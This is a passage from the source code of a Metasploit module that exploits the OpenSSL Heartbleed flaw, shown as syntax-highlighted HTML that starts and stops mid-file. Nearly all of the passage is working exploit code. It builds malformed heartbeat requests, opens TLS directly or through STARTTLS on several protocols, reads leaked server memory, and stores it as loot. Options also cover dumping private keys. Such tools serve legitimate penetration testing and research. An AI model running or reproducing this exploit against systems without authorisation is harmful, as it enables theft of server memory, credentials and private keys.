  <span class="string">&#x27;1.1&#x27;</span>   =&gt; <span class="number">0x0302</span>,</span><br><span class="line">    <span class="string">&#x27;1.2&#x27;</span>   =&gt; <span class="number">0x0303</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable constant_">TLS_CALLBACKS</span> = &#123;</span><br><span class="line">    <span class="string">&#x27;SMTP&#x27;</span>   =&gt; <span class="symbol">:tls_smtp</span>,</span><br><span class="line">    <span class="string">&#x27;IMAP&#x27;</span>   =&gt; <span class="symbol">:tls_imap</span>,</span><br><span class="line">    <span class="string">&#x27;JABBER&#x27;</span> =&gt; <span class="symbol">:tls_jabber</span>,</span><br><span class="line">    <span class="string">&#x27;POP3&#x27;</span>   =&gt; <span class="symbol">:tls_pop3</span>,</span><br><span class="line">    <span class="string">&#x27;FTP&#x27;</span>    =&gt; <span class="symbol">:tls_ftp</span>,</span><br><span class="line">    <span class="string">&#x27;POSTGRES&#x27;</span>   =&gt; <span class="symbol">:tls_postgres</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment"># See the discussion at https://github.com/rapid7/metasploit-framework/pull/3252</span></span><br><span class="line">  <span class="variable constant_">SAFE_CHECK_MAX_RECORD_LENGTH</span> = (<span class="number">1</span> &lt;&lt; <span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># For verbose output, deduplicate repeated characters beyond this threshold</span></span><br><span class="line">  <span class="variable constant_">DEDUP_REPEATED_CHARS_THRESHOLD</span> = <span class="number">400</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span></span><br><span class="line">    <span class="variable language_">super</span>(</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&#x27;OpenSSL Heartbeat (Heartbleed) Information Leak&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;...&#125;</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span>         =&gt; [...],</span><br><span class="line">      <span class="string">&#x27;References&#x27;</span>     =&gt; [...],</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;2014-04-07&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span>        =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">      <span class="string">&#x27;Actions&#x27;</span>        =&gt; [...],</span><br><span class="line">      <span class="string">&#x27;DefaultAction&#x27;</span> =&gt; <span class="string">&#x27;SCAN&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Notes&#x27;</span> =&gt; &#123;...&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    register_options(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">Opt</span><span class="symbol">:</span><span class="symbol">:RPORT</span>(<span class="number">443</span>),</span><br><span class="line">        <span class="title class_">OptEnum</span>.new(<span class="string">&#x27;TLS_CALLBACK&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Protocol to use, &quot;None&quot; to use raw TLS sockets&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, [ <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;SMTP&#x27;</span>, <span class="string">&#x27;IMAP&#x27;</span>, <span class="string">&#x27;JABBER&#x27;</span>, <span class="string">&#x27;POP3&#x27;</span>, <span class="string">&#x27;FTP&#x27;</span>, <span class="string">&#x27;POSTGRES&#x27;</span> ]]),</span><br><span class="line">        <span class="title class_">OptEnum</span>.new(<span class="string">&#x27;TLS_VERSION&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;TLS/SSL version to use&#x27;</span>, <span class="string">&#x27;1.0&#x27;</span>, [<span class="string">&#x27;SSLv3&#x27;</span>,<span class="string">&#x27;1.0&#x27;</span>, <span class="string">&#x27;1.1&#x27;</span>, <span class="string">&#x27;1.2&#x27;</span>]]),</span><br><span class="line">        <span class="title class_">OptInt</span>.new(<span class="string">&#x27;MAX_KEYTRIES&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Max tries to dump key&#x27;</span>, <span class="number">50</span>]),</span><br><span class="line">        <span class="title class_">OptInt</span>.new(<span class="string">&#x27;STATUS_EVERY&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;How many retries until key dump status&#x27;</span>, <span class="number">5</span>]),</span><br><span class="line">        <span class="title class_">OptRegexp</span>.new(<span class="string">&#x27;DUMPFILTER&#x27;</span>, [<span class="literal">false</span>, <span class="string">&#x27;Pattern to filter leaked memory before storing&#x27;</span>, <span class="literal">nil</span>]),</span><br><span class="line">        <span class="title class_">OptInt</span>.new(<span class="string">&#x27;RESPONSE_TIMEOUT&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Number of seconds to wait for a server response&#x27;</span>, <span class="number">10</span>]),</span><br><span class="line">        <span class="title class_">OptInt</span>.new(<span class="string">&#x27;LEAK_COUNT&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Number of times to leak memory per SCAN or DUMP invocation&#x27;</span>, <span class="number">1</span>])</span><br><span class="line">      ])</span><br><span class="line"></span><br><span class="line">    register_advanced_options(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">OptInt</span>.new(<span class="string">&#x27;HEARTBEAT_LENGTH&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Heartbeat length&#x27;</span>, <span class="number">65535</span>]),</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;XMPPDOMAIN&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The XMPP Domain to use when Jabber is selected&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>])</span><br><span class="line">      ])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># Main methods</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Called when using check</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">check_host</span>(<span class="params">ip</span>)</span><br><span class="line">    <span class="variable">@check_only</span> = <span class="literal">true</span></span><br><span class="line">    vprint_status <span class="string">&quot;Checking for Heartbleed exposure&quot;</span></span><br><span class="line">    <span class="keyword">if</span> bleed</span><br><span class="line">      <span class="title class_">Exploit</span><span class="symbol">:</span><span class="symbol">:CheckCode</span><span class="symbol">:</span><span class="symbol">:Appears</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="title class_">Exploit</span><span class="symbol">:</span><span class="symbol">:CheckCode</span><span class="symbol">:</span><span class="symbol">:Safe</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Main method</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">run</span></span><br><span class="line">    <span class="keyword">if</span> heartbeat_length &gt; <span class="number">65535</span> |<span class="params"></span>| heartbeat_length &lt; <span class="number">0</span></span><br><span class="line">      print_error(<span class="string">&#x27;HEARTBEAT_LENGTH should be a natural number less than 65536&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response_timeout &lt; <span class="number">0</span></span><br><span class="line">      print_error(<span class="string">&#x27;RESPONSE_TIMEOUT should be bigger than 0&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">super</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Main method</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">run_host</span>(<span class="params">ip</span>)</span><br><span class="line">    <span class="keyword">case</span> action.name</span><br><span class="line">      <span class="comment"># SCAN and DUMP are similar, but DUMP stores loot</span></span><br><span class="line">      <span class="keyword">when</span> <span class="string">&#x27;SCAN&#x27;</span>, <span class="string">&#x27;DUMP&#x27;</span></span><br><span class="line">        <span class="comment"># &#x27;Tis but a scratch</span></span><br><span class="line">        bleeded = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="number">1</span>.upto(leak_count) <span class="keyword">do</span> |<span class="params">count</span>|</span><br><span class="line">          vprint_status(<span class="string">&quot;Leaking heartbeat response #<span class="subst">#&#123;count&#125;</span>&quot;</span>)</span><br><span class="line">          bleeded &lt;&lt; bleed.to_s</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        loot_and_report(bleeded)</span><br><span class="line">      <span class="keyword">when</span> <span class="string">&#x27;KEYS&#x27;</span></span><br><span class="line">        get_keys</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="comment"># Shouldn&#x27;t get here, since Action is Enum</span></span><br><span class="line">        print_error(<span class="string">&quot;Unknown Action: <span class="subst">#&#123;action.name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ensure all connections are closed</span></span><br><span class="line">    disconnect</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># DATASTORE values</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># If this is merely a check, set to the RFC-defined</span></span><br><span class="line">  <span class="comment"># maximum padding length of 2^14. See:</span></span><br><span class="line">  <span class="comment"># https://tools.ietf.org/html/rfc6520#section-4</span></span><br><span class="line">  <span class="comment"># https://github.com/rapid7/metasploit-framework/pull/3252</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">heartbeat_length</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@check_only</span></span><br><span class="line">      <span class="variable constant_">SAFE_CHECK_MAX_RECORD_LENGTH</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      datastore[<span class="string">&#x27;HEARTBEAT_LENGTH&#x27;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">response_timeout</span></span><br><span class="line">    datastore[<span class="string">&#x27;RESPONSE_TIMEOUT&#x27;</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">tls_version</span></span><br><span class="line">    datastore[<span class="string">&#x27;TLS_VERSION&#x27;</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">dumpfilter</span></span><br><span class="line">    datastore[<span class="string">&#x27;DUMPFILTER&#x27;</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">max_keytries</span></span><br><span class="line">    datastore[<span class="string">&#x27;MAX_KEYTRIES&#x27;</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">xmpp_domain</span></span><br><span class="line">    datastore[<span class="string">&#x27;XMPPDOMAIN&#x27;</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">status_every</span></span><br><span class="line">    datastore[<span class="string">&#x27;STATUS_EVERY&#x27;</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">tls_callback</span></span><br><span class="line">    datastore[<span class="string">&#x27;TLS_CALLBACK&#x27;</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">leak_count</span></span><br><span class="line">    datastore[<span class="string">&#x27;LEAK_COUNT&#x27;</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># TLS Callbacks</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">tls_smtp</span></span><br><span class="line">    <span class="comment"># https://tools.ietf.org/html/rfc3207</span></span><br><span class="line">    get_data</span><br><span class="line">    sock.put(<span class="string">&quot;EHLO <span class="subst">#&#123;<span class="title class_">Rex</span><span class="symbol">:</span><span class="symbol">:Text</span>.rand_text_alpha(<span class="number">10</span>)&#125;</span>\r\n&quot;</span>)</span><br><span class="line">    res = get_data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unless</span> res &amp;&amp; res =~ <span class="regexp">/STARTTLS/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    sock.put(<span class="string">&quot;STARTTLS\r\n&quot;</span>)</span><br><span class="line">    get_data</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">tls_imap</span></span><br><span class="line">    <span class="comment"># http://tools.ietf.org/html/rfc2595</span></span><br><span class="line">    get_data</span><br><span class="line">    sock.put(<span class="string">&quot;a001 CAPABILITY\r\n&quot;</span>)</span><br><span class="line">    res = get_data</span><br><span class="line">    <span class="keyword">unless</span> res &amp;&amp; res =~ <span class="regexp">/STARTTLS/i</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    sock.put(<span class="string">&quot;a002 STARTTLS\r\n&quot;</span>)</span><br><span class="line">    get_data</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">tls_postgres</span></span><br><span class="line">    <span class="comment"># postgresql TLS - works with all modern pgsql versions - 8.0 - 9.3</span></span><br><span class="line">    <span class="comment"># http://www.postgresql.org/docs/9.3/static/protocol-message-formats.html</span></span><br><span class="line">    get_data</span><br><span class="line">    <span class="comment"># the postgres SSLRequest packet is a int32(8) followed by a int16(1234),</span></span><br><span class="line">    <span class="comment"># int16(5679) in network format</span></span><br><span class="line">    psql_sslrequest = [<span class="number">8</span>].pack(<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">    psql_sslrequest &lt;&lt; [<span class="number">1234</span>, <span class="number">5679</span>].pack(<span class="string">&#x27;n*&#x27;</span>)</span><br><span class="line">    sock.put(psql_sslrequest)</span><br><span class="line">    res = get_data</span><br><span class="line">    <span class="keyword">unless</span> res &amp;&amp; res =~ <span class="regexp">/S/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">tls_pop3</span></span><br><span class="line">    <span class="comment"># http://tools.ietf.org/html/rfc2595</span></span><br><span class="line">    get_data</span><br><span class="line">    sock.put(<span class="string">&quot;CAPA\r\n&quot;</span>)</span><br><span class="line">    res = get_data</span><br><span class="line">    <span class="keyword">if</span> res.<span class="literal">nil</span>? |<span class="params"></span>| res =~ <span class="regexp">/^-/</span> |<span class="params"></span>| res !~ <span class="regexp">/STLS/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    sock.put(<span class="string">&quot;STLS\r\n&quot;</span>)</span><br><span class="line">    res = get_data</span><br><span class="line">    <span class="keyword">if</span> res.<span class="literal">nil</span>? |<span class="params"></span>| res =~ <span class="regexp">/^-/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">jabber_connect_msg</span>(<span class="params">hostname</span>)</span><br><span class="line">    <span class="comment"># http://xmpp.org/extensions/xep-0035.html</span></span><br><span class="line">    msg = <span class="string">&quot;&lt;stream:stream xmlns=&#x27;jabber:client&#x27; &quot;</span></span><br><span class="line">    msg &lt;&lt; <span class="string">&quot;xmlns:stream=&#x27;http://etherx.jabber.org/streams&#x27; &quot;</span></span><br><span class="line">    msg &lt;&lt; <span class="string">&quot;version=&#x27;1.0&#x27; &quot;</span></span><br><span class="line">    msg &lt;&lt; <span class="string">&quot;to=&#x27;<span class="subst">#&#123;hostname&#125;</span>&#x27;&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">tls_jabber</span></span><br><span class="line">    sock.put(jabber_connect_msg(xmpp_domain))</span><br><span class="line">    res = get_data</span><br><span class="line">    <span class="keyword">if</span> res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;host-unknown&#x27;</span>)</span><br><span class="line">      jabber_host = res.match(<span class="regexp">/ from=&#x27;([\w.]*)&#x27; /</span>)</span><br><span class="line">      <span class="keyword">if</span> jabber_host &amp;&amp; jabber_host[<span class="number">1</span>]</span><br><span class="line">        disconnect</span><br><span class="line">        establish_connect</span><br><span class="line">        vprint_status(<span class="string">&quot;Connecting with autodetected remote XMPP hostname: <span class="subst">#&#123;jabber_host[<span class="number">1</span>]&#125;</span>...&quot;</span>)</span><br><span class="line">        sock.put(jabber_connect_msg(jabber_host[<span class="number">1</span>]))</span><br><span class="line">        res = get_data</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> res.<span class="literal">nil</span>? |<span class="params"></span>| res.<span class="keyword">include</span>?(<span class="string">&#x27;stream:error&#x27;</span>) |<span class="params"></span>| res !~ <span class="regexp">/&lt;starttls xmlns=[&#x27;&quot;]urn:ietf:params:xml:ns:xmpp-tls[&#x27;&quot;]/</span></span><br><span class="line">      vprint_error(<span class="string">&quot;Jabber host unknown. Please try changing the XMPPDOMAIN option.&quot;</span>) <span class="keyword">if</span> res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;host-unknown&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    msg = <span class="string">&quot;&lt;starttls xmlns=&#x27;urn:ietf:params:xml:ns:xmpp-tls&#x27;/&gt;&quot;</span></span><br><span class="line">    sock.put(msg)</span><br><span class="line">    res = get_data</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">if</span> res.<span class="literal">nil</span>? |<span class="params"></span>| !res.<span class="keyword">include</span>?(<span class="string">&#x27;&lt;proceed&#x27;</span>)</span><br><span class="line">    res</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">tls_ftp</span></span><br><span class="line">    <span class="comment"># http://tools.ietf.org/html/rfc4217</span></span><br><span class="line">    res = get_data</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">if</span> res.<span class="literal">nil</span>?</span><br><span class="line">    sock.put(<span class="string">&quot;AUTH TLS\r\n&quot;</span>)</span><br><span class="line">    res = get_data</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">if</span> res.<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> res !~ <span class="regexp">/^234/</span></span><br><span class="line">      <span class="comment"># res contains the error message</span></span><br><span class="line">      vprint_error(<span class="string">&quot;FTP error: <span class="subst">#&#123;res.strip&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># Helper Methods</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Get data from the socket</span></span><br><span class="line">  <span class="comment"># this ensures the requested length is read (if available)</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">length = -<span class="number">1</span></span>)</span><br><span class="line">    to_receive = length</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    done = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">while</span> done == <span class="literal">false</span></span><br><span class="line">      <span class="keyword">begin</span></span><br><span class="line">        temp = sock.get_once(to_receive, response_timeout)</span><br><span class="line">      <span class="keyword">rescue</span> <span class="title class_">EOFError</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span> <span class="keyword">if</span> temp.<span class="literal">nil</span>?</span><br><span class="line"></span><br><span class="line">      data &lt;&lt; temp</span><br><span class="line">      <span class="keyword">if</span> length != -<span class="number">1</span></span><br><span class="line">        to_receive -= temp.length</span><br><span class="line">        done = <span class="literal">true</span> <span class="keyword">if</span> to_receive &lt;= <span class="number">0</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    data</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">to_hex_string</span>(<span class="params">data</span>)</span><br><span class="line">    data.each_byte.map &#123; |<span class="params">b</span>| sprintf(<span class="string">&#x27;%02X &#x27;</span>, b) &#125;.join.strip</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># establishes a connect and parses the server response</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">establish_connect</span></span><br><span class="line">    connect</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unless</span> tls_callback == <span class="string">&#x27;None&#x27;</span></span><br><span class="line">      vprint_status(<span class="string">&quot;Trying to start SSL via <span class="subst">#&#123;tls_callback&#125;</span>&quot;</span>)</span><br><span class="line">      res = <span class="variable language_">self</span>.send(<span class="variable constant_">TLS_CALLBACKS</span>[tls_callback])</span><br><span class="line">      <span class="keyword">if</span> res.<span class="literal">nil</span>?</span><br><span class="line">        vprint_error(<span class="string">&quot;STARTTLS failed...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    vprint_status(<span class="string">&quot;Sending Client Hello...&quot;</span>)</span><br><span class="line">    sock.put(client_hello)</span><br><span class="line"></span><br><span class="line">    server_resp = get_server_hello</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> server_resp.<span class="literal">nil</span>?</span><br><span class="line">      vprint_error(<span class="string">&quot;Server Hello Not Found&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    server_resp</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Generates a heartbeat request</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">heartbeat_request</span>(<span class="params">length</span>)</span><br><span class="line">    payload = <span class="string">&quot;\x01&quot;</span>              <span class="comment"># Heartbeat Message Type: Request (1)</span></span><br><span class="line">    payload &lt;&lt; [length].pack(<span class="string">&#x27;n&#x27;</span>) <span class="comment"># Payload Length: 65535</span></span><br><span class="line"></span><br><span class="line">    ssl_record(<span class="variable constant_">HEARTBEAT_RECORD_TYPE</span>, payload)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Generates, sends and receives a heartbeat message</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">bleed</span></span><br><span class="line">    connect_result = establish_connect</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> connect_result.<span class="literal">nil</span>?</span><br><span class="line"></span><br><span class="line">    vprint_status(<span class="string">&quot;Sending Heartbeat...&quot;</span>)</span><br><span class="line">    sock.put(heartbeat_request(heartbeat_length))</span><br><span class="line">    hdr = get_data(<span class="variable constant_">SSL_RECORD_HEADER_SIZE</span>)</span><br><span class="line">    <span class="keyword">if</span> hdr.<span class="literal">nil</span>? |<span class="params"></span>| hdr.empty?</span><br><span class="line">      vprint_error(<span class="string">&quot;No Heartbeat response...&quot;</span>)</span><br><span class="line">      disconnect</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    unpacked = hdr.unpack(<span class="string">&#x27;Cnn&#x27;</span>)</span><br><span class="line">    type = unpacked[<span class="number">0</span>]</span><br><span class="line">    version = unpacked[<span class="number">1</span>] <span class="comment"># must match the type from client_hello</span></span><br><span class="line">    len = unpacked[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># try to get the TLS error</span></span><br><span class="line">    <span class="keyword">if</span> type == <span class="variable constant_">ALERT_RECORD_TYPE</span></span><br><span class="line">      res = get_data(len)</span><br><span class="line">      alert_unp = res.unpack(<span class="string">&#x27;CC&#x27;</span>)</span><br><span class="line">      alert_level = alert_unp[<span class="number">0</span>]</span><br><span class="line">      alert_desc = alert_unp[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">      <span class="comment"># http://tools.ietf.org/html/rfc5246#section-7.2</span></span><br><span class="line">      <span class="keyword">case</span> alert_desc</span><br><span class="line">      <span class="keyword">when</span> <span class="number">0x46</span></span><br><span class="line">        msg = <span class="string">&#x27;Protocol error. Looks like the chosen protocol is not supported.&#x27;</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        msg = <span class="string">&#x27;Unknown error&#x27;</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      vprint_error(<span class="string">&quot;<span class="subst">#&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line">      disconnect</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unless</span> type == <span class="variable constant_">HEARTBEAT_RECORD_TYPE</span> &amp;&amp; version == <span class="variable constant_">TLS_VERSION</span>[tls_version]</span><br><span class="line">      vprint_error(<span class="string">&quot;Unexpected Heartbeat response header (<span class="subst">#&#123;to_hex_string(hdr)&#125;</span>)&quot;</span>)</span><br><span class="line">      disconnect</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    heartbeat_data = get_data(heartbeat_length)</span><br><span class="line">    vprint_status(<span class="string">&quot;Heartbeat response, <span class="subst">#&#123;heartbeat_data.length&#125;</span> bytes&quot;</span>)</span><br><span class="line">    disconnect</span><br><span class="line">    heartbeat_data</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Stores received data</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">loot_and_report</span>(<span class="params">heartbeat_data</span>)</span><br><span class="line">    <span class="keyword">if</span> heartbeat_data.to_s.empty?</span><br><span class="line">      vprint_error(<span class="string">&quot;Looks like there isn&#x27;t leaked information...&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    print_good(<span class="string">&quot;Heartbeat response with leak, <span class="subst">#&#123;heartbeat_data.length&#125;</span> bytes&quot;</span>)</span><br><span class="line">    report_vuln(&#123;</span><br><span class="line">      <span class="symbol">:host</span> =&gt; rhost,</span><br><span class="line">      <span class="symbol">:port</span> =&gt; rport,</span><br><span class="line">      <span class="symbol">:name</span> =&gt; <span class="variable language_">self</span>.name,</span><br><span class="line">      <span class="symbol">:refs</span> =&gt; <span class="variable language_">self</span>.references,</span><br><span class="line">      <span class="symbol">:info</span> =&gt; <span class="string">&quot;Module <span class="subst">#&#123;<span class="variable language_">self</span>.fullname&#125;</span> successfully leaked info&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> action.name == <span class="string">&#x27;DUMP&#x27;</span> <span class="comment"># Check mode, dump if requested.</span></span><br><span class="line">      pattern = dumpfilter</span><br><span class="line">      <span class="keyword">if</span> pattern</span><br><span class="line">        match_data = heartbeat_data.scan(pattern).join</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        match_data = heartbeat_data</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      path = store_loot(</span><br><span class="line">        <span class="string">&#x27;openssl.heartbleed.server&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;application/octet-stream&#x27;</span>,</span><br><span class="line">        rhost,</span><br><span class="line">        match_data,</span><br><span class="line">        <span class="literal">nil</span>,</span><br><span class="line">        <span class="string">&#x27;OpenSSL Heartbleed server memory&#x27;</span></span><br><span class="line">      )</span><br><span class="line">      print_good(<span class="string">&quot;Heartbeat data stored in <span class="subst">#&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Convert non-printable characters to periods</span></span><br><span class="line">    printable_data = heartbeat_data.gsub(<span class="regexp">/[^[:print:]]/</span>, <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Keep this many duplicates as padding around the deduplication message</span></span><br><span class="line">    duplicate_pad = (<span class="variable constant_">DEDUP_REPEATED_CHARS_THRESHOLD</span> / <span class="number">3</span>).round</span><br><span 